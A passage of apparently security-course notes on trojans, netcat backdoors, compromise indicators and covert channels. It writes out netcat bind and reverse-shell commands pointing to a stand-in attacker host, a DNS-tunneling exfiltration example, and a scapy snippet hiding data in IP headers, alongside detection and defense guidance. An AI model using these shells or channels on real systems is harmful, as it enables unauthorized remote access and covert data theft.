**Why it works**: most firewalls are configured to block unsolicited inbound connections but allow outbound traffic; a reverse connection looks like the victim's machine reaching out (similar to normal web browsing), which is much harder to block without breaking legitimate use.

**Typical flow**:
```
1. Attacker sets up a listener on their machine (e.g., nc -lvnp 4444)
2. Victim executes the trojan/backdoor
3. Trojan initiates an outbound connection to the attacker's IP:port
4. Attacker's listener accepts the connection and gets a shell
```
Metasploit's `reverse_tcp`, `reverse_http`, and `reverse_https` payloads are all reverse-connecting trojans — see Section 4.2 of Session 11 (HTTPS Tunneling) for a worked example using `reverse_https`.

### 5.6 Netcat Trojan

Netcat ("the Swiss Army knife of networking") is frequently used to build a simple backdoor/reverse-shell trojan because it can bind a shell to a port or connect out to a remote listener with minimal code.

**Bind shell (victim listens, attacker connects in)**:
```bash
# On the victim (attacker must reach this port — often blocked by firewalls)
nc -lvnp 4444 -e /bin/bash      # Linux
nc -lvnp 4444 -e cmd.exe        # Windows
```

**Reverse shell (victim connects out to attacker — the common trojan pattern)**:
```bash
# Attacker: start a listener
nc -lvnp 4444

# Victim: connect back to the attacker with a shell attached
nc attacker_ip 4444 -e /bin/bash   # Linux
nc attacker_ip 4444 -e cmd.exe     # Windows
```
Once connected, the attacker has interactive shell access to the victim's machine over the netcat connection.

**Why it's dangerous**: netcat is a legitimate, widely available tool (often already installed), so its use may not trigger antivirus signatures the way custom malware would; it's simple enough to embed in scripts or batch files delivered via other trojan/backdoor techniques.

**Defense**: block or monitor outbound connections to unusual ports/IPs with a firewall; restrict or monitor netcat usage in enterprise environments; use application whitelisting; inspect for unsigned/unexpected binaries named `nc`, `ncat`, `netcat` on endpoints.

### 5.7 Indications of a Trojan Attack

Signs that a system may be compromised by a trojan or backdoor:

- **Unusual system behavior**: unexpected slowdowns, crashes, or freezes; programs opening/closing on their own; the mouse or keyboard behaving erratically.
- **Unexpected network activity**: unfamiliar outbound connections in `netstat`/Task Manager; high network usage with no obvious cause; connections to unknown or suspicious IP addresses/ports.
- **Unfamiliar processes or programs**: unknown processes running (visible in Task Manager/`ps`); new, unrecognized applications or icons appearing; programs that won't close or that restart themselves.
- **Security software issues**: antivirus/firewall unexpectedly disabled or unable to update; security alerts suddenly stop appearing; inability to access security vendor websites.
- **File system changes**: new or modified files/folders the user didn't create; files disappearing or being encrypted (possible ransomware trojan); unusual disk activity even when idle.
- **System settings changes**: browser homepage or default search engine changed without consent; new unfamiliar toolbars, extensions, or startup programs; firewall rules or registry entries modified unexpectedly.
- **Account/credential anomalies**: unexpected password reset emails; unfamiliar login locations/times in account activity logs; new user accounts appearing on the system.
- **Performance degradation**: high CPU/GPU/disk usage from unknown processes (possible cryptomining trojan); fans running at full speed constantly; noticeably shorter battery life on laptops.

**Response if a trojan is suspected**: disconnect the system from the network to stop further C2 communication or exfiltration; run a full anti-malware/rootkit scan; check `netstat`, running processes, and startup entries for anomalies; if compromise is confirmed, isolate, reimage where possible, and reset all credentials used on that machine.

---

## 6. Overt and Covert Channels

### 6.1 Overt Channels

**Definition**: legitimate, expected communication paths used for normal network operations and data transfer.

**Characteristics**: visible and expected traffic; authorized by security policy; uses standard protocols; no concealment of data; compliant with firewalls/monitoring.

| Channel | Protocol | Port | Use Case |
|---|---|---|---|
| Web Traffic | HTTP/HTTPS | 80, 443 | Normal browsing, web apps |
| Email | SMTP, IMAP, POP3 | 25, 143, 110 | Email communication |
| File Transfer | FTP, SFTP | 21, 22 | File uploads/downloads |
| Remote Access | SSH, RDP | 22, 3389 | System administration |
| DNS | DNS | 53 | Domain name resolution |
| Database | MySQL, PostgreSQL | 3306, 5432 | Database queries |

Security monitoring: firewalls allow overt-channel traffic; IDS/IPS inspects it for anomalies; logs capture source/destination/timing; deep packet inspection analyzes content.

### 6.2 Covert Channels

**Definition**: hidden communication methods used to exfiltrate data secretly, bypass security controls, or maintain C2 communication while evading detection.

**Characteristics**: traffic appears legitimate but carries hidden data; unauthorized/unapproved; designed to evade detection; used for exfiltration, C2, or attacks.

**1. Storage Covert Channels** — hide data within packet headers, file formats, or unused fields.
- *IP header*: hide data in the IP ID field or TTL field.
- *ICMP*: hide data in the ICMP payload (echo request/response used bidirectionally).
- *DNS tunneling*: encode data in subdomains queried (`base64data.attacker.com` as a TXT query) — see Session 11 §4.3 for the tunneling mechanics; tools: iodine, dnscat2, OzymanDNS. Detection: unusual query length/frequency, TXT record queries, entropy analysis.
- *HTTP*: hide data in custom headers, cookies, or URL parameters.
```python
from scapy.all import IP, send
for byte in b"SECRET":
    send(IP(dst="192.168.1.1", id=byte))   # hide byte in IP ID field
```

**2. Timing Covert Channels** — encode data in the *timing* of packet transmissions rather than their content, e.g., a short delay (50ms) = binary 0, a long delay (200ms) = binary 1. Also possible via TCP timestamp fields. Detection: statistical analysis of inter-packet timing/variance.

**3. Protocol Covert Channels** — abuse legitimate protocols for unauthorized communication, e.g., encoding data in TCP sequence/ACK numbers or flags; hiding data in BGP AS_PATH/community attributes; using social media posts/hashtags as a C2 channel (malware scrapes a hashtag for base64-encoded commands). Detection: monitor for unusual protocol usage and correlate network traffic with expected user activity.

**4. File-Based Covert Channels** — hide data within files.
- *Steganography (images)*: modify the least significant bits (LSB) of pixel values — invisible to the eye but extractable programmatically.
```python
from PIL import Image
# modify LSB of each pixel to encode a hidden binary message
```
- *Document covert channels*: hide data in whitespace/formatting, metadata (author, comments), or macros.

Detection (steganalysis): statistical/LSB analysis (chi-square tests), comparing original vs. modified files; inspecting document metadata and structure.

### 6.3 Covert Channel Detection and Prevention

| Technique | Description |
|---|---|
| Deep Packet Inspection | Analyze headers/payloads for anomalies |
| Statistical Analysis | Detect unusual timing/packet-size patterns |
| Protocol Analysis | Verify protocol compliance, detect abuse |
| Traffic Analysis | Monitor unusual volumes/destinations |
| File Inspection | Scan for hidden data (steganalysis) |
| Behavioral Analysis | Detect anomalous system behavior |
| Firewall Rules | Block/restrict suspicious protocols |
| IDS/IPS | Signature and anomaly-based detection |

### 6.4 Overt vs. Covert — Comparison

| Characteristic | Overt Channels | Covert Channels |
|---|---|---|
| Visibility | Visible, expected | Hidden, disguised |
| Authorization | Approved, legitimate | Unauthorized, malicious |
| Detection | Easy (normal traffic) | Difficult (requires analysis) |
| Purpose | Normal communication | Data exfiltration, C2 |
| Protocols | Standard (HTTP, DNS, email) | Standard protocols abused |
| Security Policy | Compliant | Violates policy |
| Examples | Web browsing, email | DNS tunneling, steganography |
